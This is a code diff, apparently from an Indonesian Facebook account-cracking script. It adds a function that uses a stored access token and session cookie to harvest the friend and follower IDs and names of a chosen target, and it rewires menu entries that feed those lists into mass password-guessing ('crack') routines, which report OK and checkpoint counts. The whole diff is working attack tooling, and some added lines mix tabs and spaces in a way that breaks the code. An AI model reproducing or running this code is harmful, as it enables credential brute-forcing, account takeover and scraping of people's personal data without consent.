@@ -216,7 +216,14 @@ from rich import print as rprint  # Jika Anda menggunakan modul rich untuk forma
 
 def info_user():
     try:
-        response = requests.get('https://ipinfo.io')
+        token = open('token.txt','r').read()
+		cookie = open('cok.txt','r').read()
+		coki = {"cookie":cookie}
+		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
+		el = json.loads(coa.text)
+		lk = el["name"]
+		ld = el["id"]
+		response = requests.get('https://ipinfo.io')
         data = response.json()
 
         alamat_ip = data.get('ip')
@@ -227,8 +234,8 @@ def info_user():
 
         # Menggunakan rprint dari modul rich untuk formatting
         rprint(nel(f'                            [bold blue]Info User'))
-        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your Name:[bold green]{kota}")
-        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your Idz:[bold green]{kota}")
+        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your Name:[bold green]{lk}")
+        rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your Idz:[bold green]{ld}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Your IP:[bold green]{alamat_ip}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Region:[bold green]{region}")
         rprint(f"  {H2}╰─▶{B2} ✶ [bold yellow] Lokasi:[bold green]{lokasi}")
@@ -389,10 +396,10 @@ def login_menu():
              {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
     ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
     if ___Sllowly_ID____ in ['1']:
-        massal()
+        massal2()
     elif ___Sllowly_ID____ in ['2']:
 	    prints(nel(f'                         [bold blue]Publik Crack')) 
-	    dump2()
+	    dump3()
     elif ___Sllowly_ID____ in ['3']:
 	    mail2()
     elif ___Sllowly_ID____ in ['4']:
@@ -445,7 +452,7 @@ def dump(idt,fields,cookie,token):
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
-#-------------------[ CRACK-PUBLIK ]----------------#
+#-------------------[ CRACK-PUBLIK2 ]----------------#
 def dump2():
 	with requests.Session() as ses:
 		token = open('.token.txt','r').read()
@@ -462,8 +469,61 @@ def dump2():
 			print(' : {}'.format(len(id)));setting()
 		except Exception as e:
 			print(e)
+#-------------------[ CRACK-PUBLIK3 ]----------------#
+def dump3():
+	print("")
+	x=f"\t\t{P2}Target harus public & banyak friends nya"
+	vprint(panel(x,style=f"bold purple"))
+	x=f"\t\t{P2}ketik {H2}Me{P2} untuk crack dari pertemanan"
+	vprint(panel(x,style=f"bold purple"))
+	put = input(garis+" Target id public :"+H+" ")
+	try:
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
+		el = json.loads(coa.text)
+		try:lk = el["name"]
+		except (KeyError,IOError):
+			lk = M+"-"+P
+		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
+		#print(f"{garis} Mengambil ID Teman"+H+": "+nama["name"])
+		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
+		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
+		#try:
+			#Hikmat = link["data"]
+			#ttl__ = []
+			#ttl__.append("\033[96;1m + TTL")
+		#except:
+			#pass
+		#if len(link["data"]) == 0:
+			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
+			#print(M+" [x] Coba cari Akun yg lainnya!")
+			#exit()
+		#global ttl__
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
+		for fuck in cyna['friends']['data']:
+			try:id.append(fuck['id']+'|'+fuck['name'])
+			except:continue
+		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
+		for fak in cini['subscribers']['data']:
+			try:id3.append(fak['id']+'|'+fak['name'])
+			except:continue
+		#print(maling_pangsit+" nama target :%s %s"(H,lk))
+		x=f"{P2}Nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
+		vprint(panel(x,style=f"bold purple"))
+		setting()
+	except requests.exceptions.ConnectionError:
+		jalan(garis+" koneksi internet bermasalah ")
+		exit()
+	except (KeyError,IOError):
+		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
+		exit()
 #-----------------[ CRACK EMAIL ]-----------------#
-def mail1():
+def mail2():
 	dump=[]
 	rc = random.choice
 	rr = random.randint
@@ -492,8 +552,8 @@ def mail1():
 		time.sleep(0.0000003)
 	print("\r")
 	setting()
-#-----------------[ CRACK EMAIL2 ]-----------------#
-def mail2():
+#-----------------[ CRACK MASSAL ]-----------------#
+def massal2():
     try:
         token = open(".token.txt", "r").read()
         cok = open(".cok.txt", "r").read()
@@ -863,10 +923,10 @@ def passwrd():
 			else:
 				pool.submit(crack,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan][green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
+	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
-	input(f'{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x} ]')
+	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
 	back()
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
